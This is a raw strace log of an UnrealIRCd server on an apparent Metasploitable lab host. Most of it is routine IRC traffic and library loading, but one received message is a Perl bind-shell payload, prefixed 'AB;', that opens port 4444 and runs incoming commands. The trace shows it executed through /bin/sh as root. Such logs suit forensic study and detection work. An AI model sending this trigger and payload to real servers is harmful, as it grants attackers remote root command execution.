4519  07:43:44.504868 select(1024, [2 3 4 7 9], [], NULL, {0, 920000}) = 1 (in [4], left {0, 860000})
4519  07:43:44.559748 clock_gettime(CLOCK_MONOTONIC, {3034, 376796244}) = 0
4519  07:43:44.559838 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 44
4519  07:43:44.559896 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.559931 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.559958 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.559979 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.559993 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560007 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560020 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560034 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560047 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560061 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560074 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560088 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560102 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560115 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560129 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560142 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560155 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560182 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560224 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560239 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560269 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560283 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.560300 gettimeofday({1495626224, 560304}, NULL) = 0
4519  07:43:44.560312 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 910000})
4519  07:43:44.648908 clock_gettime(CLOCK_MONOTONIC, {3034, 465928787}) = 0
4519  07:43:44.648930 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:43:44.648956 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.648974 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.648988 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649002 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649016 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649030 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649044 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649058 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649071 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649085 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649098 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649112 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649126 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649139 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649162 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649175 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649189 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649203 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649216 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649230 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649254 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649297 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:44.649329 time(NULL)        = 1495626224
4519  07:43:44.649339 time(NULL)        = 1495626224
4519  07:43:44.649351 gettimeofday({1495626224, 649355}, NULL) = 0
4519  07:43:44.649363 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:43:44.649406 clock_gettime(CLOCK_MONOTONIC, {3034, 466419213}) = 0
4519  07:43:44.649417 gettimeofday({1495626224, 649420}, NULL) = 0
4519  07:43:44.649427 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 960000})
4519  07:43:44.696019 clock_gettime(CLOCK_MONOTONIC, {3034, 513039257}) = 0
4519  07:43:44.696039 accept(2, 0, NULL) = 5
4519  07:43:44.696061 getpeername(5, {sa_family=AF_INET, sin_port=htons(37145), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:43:44.696095 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:43:44.696108 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:43:44.696121 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:43:44.696134 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:43:44.696145 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:43:44.696157 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:43:44.696180 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:43:44.696224 clock_gettime(CLOCK_MONOTONIC, {3034, 513237860}) = 0
4519  07:43:44.696239 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:43:44.696254 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:43:44.696264 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:43:44.696290 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:43:44.696300 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:43:44.696336 send(6, "\303\211\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:43:44.696499 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:43:44.696525 gettimeofday({1495626224, 696529}, NULL) = 0
4519  07:43:44.696537 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:43:44.702787 clock_gettime(CLOCK_MONOTONIC, {3034, 519804928}) = 0
4519  07:43:44.702804 recvfrom(6, "\303\211\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\371\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:43:44.702845 close(6)          = 0
4519  07:43:44.702861 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:43:44.702875 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:43:44.702932 time(NULL)        = 1495626224
4519  07:43:44.702945 time(NULL)        = 1495626224
4519  07:43:44.702957 gettimeofday({1495626224, 702960}, NULL) = 0
4519  07:43:44.702968 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:43:44.702997 clock_gettime(CLOCK_MONOTONIC, {3034, 520010578}) = 0
4519  07:43:44.703008 gettimeofday({1495626224, 703012}, NULL) = 0
4519  07:43:44.703026 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [9], left {0, 320000})
4519  07:43:45.379056 clock_gettime(CLOCK_MONOTONIC, {3035, 196076717}) = 0
4519  07:43:45.379078 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:43:45.379103 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379120 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379135 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379149 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379162 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379176 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379189 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379203 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379215 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379229 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379242 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379255 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379268 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379281 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379294 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379307 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379320 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379333 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379346 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379360 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379373 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379386 getrusage(RUSAGE_SELF, {ru_utime={0, 20000}, ru_stime={0, 580000}, ...}) = 0
4519  07:43:45.379481 gettimeofday({1495626225, 379486}, NULL) = 0
4519  07:43:45.379508 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:43:45.379548 clock_gettime(CLOCK_MONOTONIC, {3035, 196561342}) = 0
4519  07:43:45.379560 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:43:45.379587 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:43:45.379607 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:43:45.379619 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:43:45.379634 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12708
12708 07:43:45.379699 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12708 07:43:45.379713 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12708 07:43:45.379724 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12708 07:43:45.379737 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
12708 07:43:45.379844 brk(0)            = 0x80f9000
12708 07:43:45.379866 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.379882 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f26000
12708 07:43:45.379935 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.379967 open("/etc/ld.so.cache", O_RDONLY) = 1
12708 07:43:45.379979 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12708 07:43:45.379997 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f1e000
12708 07:43:45.380007 close(1)          = 0
12708 07:43:45.380018 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.380033 open("/lib/libncurses.so.5", O_RDONLY) = 1
12708 07:43:45.380046 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12708 07:43:45.380138 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12708 07:43:45.380155 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eee000
12708 07:43:45.380167 mmap2(0xb7f1b000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f1b000
12708 07:43:45.380183 close(1)          = 0
12708 07:43:45.380195 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.380209 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12708 07:43:45.380223 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12708 07:43:45.380311 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12708 07:43:45.380327 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eea000
12708 07:43:45.380338 mmap2(0xb7eec000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eec000
12708 07:43:45.380353 close(1)          = 0
12708 07:43:45.380364 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12708 07:43:45.380378 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12708 07:43:45.380418 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12708 07:43:45.380524 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12708 07:43:45.380541 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee9000
12708 07:43:45.380555 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d9a000
12708 07:43:45.380566 mmap2(0xb7ee3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ee3000
12708 07:43:45.380580 mmap2(0xb7ee6000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ee6000
12708 07:43:45.380593 close(1)          = 0
12708 07:43:45.380615 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d99000
12708 07:43:45.380627 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d996b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12708 07:43:45.380681 mprotect(0xb7ee3000, 4096, PROT_READ) = 0
12708 07:43:45.380717 munmap(0xb7f1e000, 29913) = 0
12708 07:43:45.380742 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.380756 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12708 07:43:45.380775 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8389f0) = -1 ENOTTY (Inappropriate ioctl for device)
12708 07:43:45.380804 brk(0)            = 0x80f9000
12708 07:43:45.380814 brk(0x80fa000)    = 0x80fa000
12708 07:43:45.380825 brk(0x80fb000)    = 0x80fb000
12708 07:43:45.380841 getuid32()        = 0
12708 07:43:45.380850 getgid32()        = 0
12708 07:43:45.380859 geteuid32()       = 0
12708 07:43:45.380868 getegid32()       = 0
12708 07:43:45.380881 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.380941 time(NULL)        = 1495626225
12708 07:43:45.380971 brk(0x80fc000)    = 0x80fc000
12708 07:43:45.381001 brk(0x80fd000)    = 0x80fd000
12708 07:43:45.381020 open("/proc/meminfo", O_RDONLY) = 1
12708 07:43:45.381048 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12708 07:43:45.381065 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f25000
12708 07:43:45.381076 read(1, "MemTotal:      1035240 kB\nMemFree:        305560 kB\nBuffers:         89796 kB\nCached:         478416 kB\nSwapCached:          0 kB\nActive:         258196 kB\nInactive:       438944 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        305320 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5392 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52008 kB\nSlab:            21272 kB\nSReclaimable:    12396 kB\nSUnreclaim:       8876 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12708 07:43:45.381161 close(1)          = 0
12708 07:43:45.381172 munmap(0xb7f25000, 4096) = 0
12708 07:43:45.381184 brk(0x80fe000)    = 0x80fe000
12708 07:43:45.381210 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12708 07:43:45.381222 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12708 07:43:45.381234 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12708 07:43:45.381246 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12708 07:43:45.381257 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12708 07:43:45.381268 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12708 07:43:45.381282 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12708 07:43:45.381293 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12708 07:43:45.381306 uname({sys="Linux", node="metasploitable", ...}) = 0
12708 07:43:45.381352 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12708 07:43:45.381370 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12708 07:43:45.381417 brk(0x8100000)    = 0x8100000
12708 07:43:45.381446 getcwd("/etc/unreal", 4096) = 12
12708 07:43:45.381475 getpid()          = 12708
12708 07:43:45.381504 getppid()         = 4519
12708 07:43:45.381519 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12708 07:43:45.381538 stat64("/sbin/sh", 0xbf8389c8) = -1 ENOENT (No such file or directory)
12708 07:43:45.381550 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12708 07:43:45.381567 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12708 07:43:45.381590 socket(PF_FILE, SOCK_STREAM, 0) = 1
12708 07:43:45.381603 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12708 07:43:45.381615 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12708 07:43:45.381636 close(1)          = 0
12708 07:43:45.381647 socket(PF_FILE, SOCK_STREAM, 0) = 1
12708 07:43:45.381657 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12708 07:43:45.381667 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
